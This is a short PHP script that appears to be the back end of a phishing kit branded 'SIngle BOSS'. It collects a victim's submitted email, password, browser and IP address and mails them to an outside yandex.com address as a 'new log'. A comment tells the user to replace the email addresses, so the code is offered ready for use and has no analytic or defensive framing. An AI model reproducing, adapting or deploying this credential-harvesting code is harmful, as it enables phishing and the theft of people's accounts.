<?php
/*Replace the Email addresses*/
$reciever = "allenywander@yandex.com";
$sender = "test@veronoxc.us";


//===============================================================//
	$message = "-------------+ SIngle BOSS Inc 2024 +-------------\n";	
	$message.= "Email: " . $_POST['e'] . "\n";
	$message.= "Password: " . $_POST['p'] . "\n";
	$message.= "Browser: " . $_POST['b'] . "\n";
	$message.= "IP: " . $_POST['ip'] . "\n";	
	$message.= "-----------------+ SB-Tools +------------------\n";			
	$subject = "Single Boss:231 - You've got a new log :" . $_POST['ip'] ."\n";
	$headers = "MIME-Version: 1.0\n";
	$headers .= "From: SIngle BOSS  Log Sender <".$sender.">" . "\r\n";	
	@mail($reciever, $subject, $message, $headers);
?>